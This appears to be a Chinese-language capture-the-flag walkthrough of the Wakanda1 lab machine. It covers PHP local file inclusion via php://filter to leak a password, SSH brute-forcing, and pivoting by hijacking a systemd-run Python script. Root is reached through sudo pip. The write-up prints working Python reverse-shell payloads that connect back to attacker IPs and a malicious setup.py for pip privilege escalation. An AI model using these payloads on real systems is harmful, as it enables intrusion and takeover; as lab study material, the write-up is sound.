



# mynew
?lang= 出现url sql注入和文件包含很大几率
php的伪协议，过滤器
index：HTTP/1.0 500 Internal Server Error
疑似存在文件包含，开始测试！
转换过滤器中的base64-encode过滤器可用于通过LFI检索任意服务器文件。-》获得密码
ssh账号枚举
python反弹shell
sudo pip 提权
find新技巧-深入枚举

find / -user mamadou 2>&1 | grep -v "Permission denied\|proc"
/   ---反斜杠从根目录开始查询
-user mamadou  ---搜索普通该用户权限的文件
2>&1   ----将所有错误信息重定向不输出过滤掉
-v   ---就是错误的输出过滤

通过前面脚本枚举还发现存在另一个用户：devops
find / -user devops 2>&1 | grep -v "Permission denied\|proc"
/srv/.antivirus.py
/tmp/test
/home/devops/flag2.txt

# 
1、nmap 10.211.55.0/24 -sP
Nmap scan report for localhost (10.211.55.50)


2、nmap 10.211.55.50 -p-
80/tcp    open  http
111/tcp   open  rpcbind
3333/tcp  open  dec-notes ssh OpenSSH 6.7p1
35523/tcp open  unknown status RPC

nmap 10.211.55.50 -p80,111,3333,35523 -A -T5

3、web信息枚举
访问：http://10.211.55.50/

dirb扫出的目录都是访问空白页面！

查看主页的静态源码发现：
<!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->


http://10.211.55.50/?lang=fr  ---发现跳转回了主页
dirb http://10.211.55.50/?lang=   ---发现存在fr和index
尝试访问fr.php和index.php都跳转回主页！

通过抓包分析：curl测试是否存在文件包含响应
curl -i http://10.211.55.50/?lang=fr     
curl -i http://10.211.55.50/?lang=index
-i    ----include 在输出中包含协议响应头
对比发现：
fr ：HTTP/1.1 200 OK
index：HTTP/1.0 500 Internal Server Error
疑似存在文件包含，开始测试！

==PHP存在四种过滤器：
字符串过滤器
转换过滤器
压缩过滤器
加密过滤器
https://www.runoob.com/php/php-filter.html

1）转换过滤器中的base64-encode过滤器可用于通过LFI检索任意服务器文件。
base64-encode：
https://www.php.net/manual/en/filters.convert.php
2）也可以使用压缩过滤器中的zlib.inflate或bzip2.compress来检索服务器文件而不执行它们
zlib.inflate：
https://www.php.net/manual/en/filters.compression.php
bzip2.compress：
https://www.php.net/manual/en/filters.compression.php


4、文件包含

curl http://10.211.55.50/?lang=php://filter/convert.base64-encode/resource=index | head -n 1 | base64 -d

获得密码：
Niamey4Ever227!!!
但是不知道是哪个用户的密码！

5、ssh用户名枚举爆破
1）枚举用户名
cewl http://10.211.55.50/ > 1.txt
2）暴力破解ssh
利用实战常用的：gorailgun.exe

成功获得用户：
mamadou


6、内部信息枚举

ssh mamadou@10.211.55.50 -p 3333
Niamey4Ever227!!!

输入进来发现这是：Python 2.7.9的命令框

import pty;
pty.spawn('/bin/bash');
通过python获得bash正常shell!

1）脚本信息枚举
---------------------------------
linpeas.sh信息枚举：
rwxr-sr-- 1 root   developer  281 Feb 27  2015 /usr/bin/pip
参考文章：PIP是Python包或模块的包管理器
https://www.w3schools.com/python/python_pip.asp

/tmp/test
/var/mail/mamadou
/var/log/auth.log
/var/log/syslog
/var/log/daemon.log
/home/mamadou/.gnupg/gpg.conf
/home/mamadou/.gnupg/pubring.gpg
/home/mamadou/.gnupg/trustdb.gpg
/etc/resolv.conf

---------------------------------
通过内核、信息枚举就发现一个pip但是无法使用！

2）find新技巧-深入枚举

find / -user mamadou 2>&1 | grep -v "Permission denied\|proc"
/   ---反斜杠从根目录开始查询
-user mamadou  ---搜索普通该用户权限的文件
2>&1   ----将所有错误信息重定向不输出过滤掉
-v   ---就是错误的输出过滤

通过前面脚本枚举还发现存在另一个用户：devops
find / -user devops 2>&1 | grep -v "Permission denied\|proc"
/srv/.antivirus.py
/tmp/test
/home/devops/flag2.txt
这里返现三个可疑信息：
cat /home/devops/flag2.txt
cat: /home/devops/flag2.txt: Permission denied
发现无权限打开！
cat /srv/.antivirus.py
open('/tmp/test','w').write('test')
发现这是一个可读可写的python脚本！

查看下antivirus是否存在计划任务启动该脚本：
find / -name *antivirus* 2>&1 | grep -v "Permission denied\|proc"
/srv/.antivirus.py
/lib/systemd/system/antivirus.service
发现存在antivirus.service服务检查下：
cat /lib/systemd/system/antivirus.service
RestartSec=300   ---300秒运行一次
User=devops      ---这是devops用户运行

修改/srv/.antivirus.py
那么接下来按照项目四的小技巧加入：
---------
nc -tvlp 9999

#!/usr/bin/python
def con():
	import socket, time,pty, os
	host='10.211.55.19'
	port=9999
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(10)
	s.connect((host,port))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	os.putenv("HISTFILE",'/dev/null')
	pty.spawn("/bin/bash")
	s.close()
con()

----------
nano写入后等待300秒获得反弹shell！


7、内部信息枚举-devops
cat /etc/group
developer:x:1002:    ---可看到还存在group组里的developer
find / -group developer 2>&1 | grep -v "Permission denied\|proc"
发现：/usr/bin/pip

在整个目录中枚举devops：
grep -rn / -e devops 2>&1 | grep -v "Permission denied\|proc"
/etc/subgid:11:devops:755360:65536
/etc/group:56:devops:x:1001:
/etc/passwd:29:devops:x:1001:1002:,,,:/home/devops:/bin/bash
/etc/subuid:11:devops:755360:65536
没发现新的东西，但是可看到devops的ID为1002是共用的！

sudo -l 
User devops may run the following commands on Wakanda1:
    (ALL) NOPASSWD: /usr/bin/pip

提权pip：
参考：
https://marthall.github.io/blog/how-to-package-a-python-app/
根据上面回弹的python脚本简单修改下即可：

---------
nc -tvlp 9900

from setuptools import setup   #加入

def con():
	import socket, time,pty, os
	host='192.168.139.131'
	port=9900
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(10)
	s.connect((host,port))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	os.putenv("HISTFILE",'/dev/null')
	pty.spawn("/bin/bash")
	s.close()
con()

setup(name="dayu", version="1.0")  #加入

----------
wget http://10.211.55.19:8081/setup.py
sudo pip install .   ---成功获得反弹shell





提权pip：拓展思路
poc：https://github.com/0x00-0x00/FakePip
git clone https://github.com/0x00-0x00/FakePip.git  ---下载


























































